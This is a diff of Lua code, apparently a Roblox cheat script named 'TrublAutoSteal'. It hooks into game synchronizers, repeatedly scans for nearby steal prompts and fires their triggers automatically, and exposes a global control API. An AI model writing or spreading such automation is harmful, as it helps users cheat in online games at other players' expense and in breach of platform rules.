+					local p = prompt.Parent.Parent
+					if p and p:IsA("BasePart") then
+						within = (p.Position - root2.Position).Magnitude <= continueRadius
+					end
+				end
+
+				if within then
+					heartbeatConnection:Disconnect()
+					heartbeatConnection = nil
+					task.spawn(function()
+						if not inRangeAtStart then
+							task.wait(entryDelay)
+						end
+						for _, fn in ipairs(cache.trigger) do
+							task.spawn(fn)
+						end
+						progressFill.Size = UDim2.new(0, 0, 1, 0)
+						task.wait(semiCooldown)
+						resetProgressBar()
+						cache.ready = true
+						isStealing = false
+					end)
+				end
+			end
+		end)
+		return
+	end
+
+	-- Normal mode with pause logic
+	local isPaused = false
+	local pauseSnapshot = false
+	local pauseStart = nil
+	local pausedRatio = 0
+	local currentPrompt = prompt
+
+	heartbeatConnection = RunService.Heartbeat:Connect(function()
+		if not isStealing then
+			heartbeatConnection:Disconnect()
+			return
+		end
+
+		local pauseRatio = Config.PausePercent / 100
+
+		if not isPaused then
+			local ratio = math.clamp((tick() - stealingStartTime) / Constants.STEAL_DURATION, 0, 1)
+			local root = getCharacterRoot()
+
+			if root and currentPrompt and currentPrompt.Parent then
+				local parent = currentPrompt.Parent.Parent
+				if parent and parent:IsA("BasePart") then
+					if (parent.Position - root.Position).Magnitude > Constants.STEAL_RADIUS then
+						heartbeatConnection:Disconnect()
+						heartbeatConnection = nil
+						isStealing = false
+						cache.ready = true
+						resetProgressBar()
+						return
+					end
+				end
+			end
+
+			if ratio >= pauseRatio and not pauseSnapshot then
+				isPaused = true
+				pauseSnapshot = true
+				pausedRatio = pauseRatio
+				pauseStart = tick()
+				progressFill.Size = UDim2.new(pauseRatio, 0, 1, 0)
+				return
+			end
+
+			progressFill.Size = UDim2.new(ratio, 0, 1, 0)
+
+			if ratio >= 1 then
+				heartbeatConnection:Disconnect()
+				heartbeatConnection = nil
+				for _, fn in ipairs(cache.trigger) do
+					task.spawn(fn)
+				end
+				resetProgressBar()
+				cache.ready = true
+				isStealing = false
+			end
+		else
+			local elapsed = tick() - pauseStart
+			local root = getCharacterRoot()
+
+			if root and currentPrompt and currentPrompt.Parent then
+				local parent = currentPrompt.Parent.Parent
+				if parent and parent:IsA("BasePart") then
+					if (parent.Position - root.Position).Magnitude > Constants.STEAL_RADIUS then
+						heartbeatConnection:Disconnect()
+						heartbeatConnection = nil
+						isStealing = false
+						cache.ready = true
+						resetProgressBar()
+						return
+					end
+				end
+			end
+
+			if elapsed >= Config.WaitTimeout then
+				isPaused = false
+				stealingStartTime = tick() - pausedRatio * Constants.STEAL_DURATION
+				return
+			end
+
+			local within = false
+			if root and currentPrompt and currentPrompt.Parent then
+				local parent = currentPrompt.Parent.Parent
+				if parent and parent:IsA("BasePart") then
+					within = (parent.Position - root.Position).Magnitude <= Config.ContinueRadius
+				end
+			end
+
+			if within then
+				isPaused = false
+				stealingStartTime = tick() - pausedRatio * Constants.STEAL_DURATION
+			end
+		end
+	end)
+end
+
+-- Main scan loop
+local function startScanning()
+	if scanConnection then return end
+
+	local lastScan = 0
+	scanConnection = RunService.Heartbeat:Connect(function()
+		if not Config.AutoStealEnabled or isStealing then return end
+
+		local now = tick()
+		if now - lastScan < 0.05 then return end
+		lastScan = now
+
+		local prompt = findClosestPrompt()
+		if prompt then
+			beginSteal(prompt)
+		end
+	end)
+end
+
+local function stopScanning()
+	if scanConnection then
+		scanConnection:Disconnect()
+		scanConnection = nil
+	end
+	if heartbeatConnection then
+		heartbeatConnection:Disconnect()
+		heartbeatConnection = nil
+	end
+	isStealing = false
+	resetProgressBar()
+end
+
+-- Background animal registry refresher
+task.spawn(function()
+	setupSynchronizerHooks()
+	while true do
+		refreshAnimalRegistry()
+		task.wait(5)
+	end
+end)
+
+-- ============================
+-- Public API
+-- ============================
+
+_G.TrublAutoSteal = {
+	Start = startScanning,
+	Stop = stopScanning,
+	Toggle = function(enabled)
+		Config.AutoStealEnabled = enabled
+		if enabled then
+			startScanning()
+		else
+			stopScanning()
+		end
+	end,
+	SetRadius = function(radius)
+		Config.StealRadius = radius
+		Constants.STEAL_RADIUS = radius
+		radiusInput.Text = tostring(radius)
+	end,
+	SetDuration = function(duration)
+		Config.StealDuration = duration
+		Constants.STEAL_DURATION = duration
+	end,
+	IsStealing = function()
+		return isStealing
+	end,
+}
+
+startScanning()
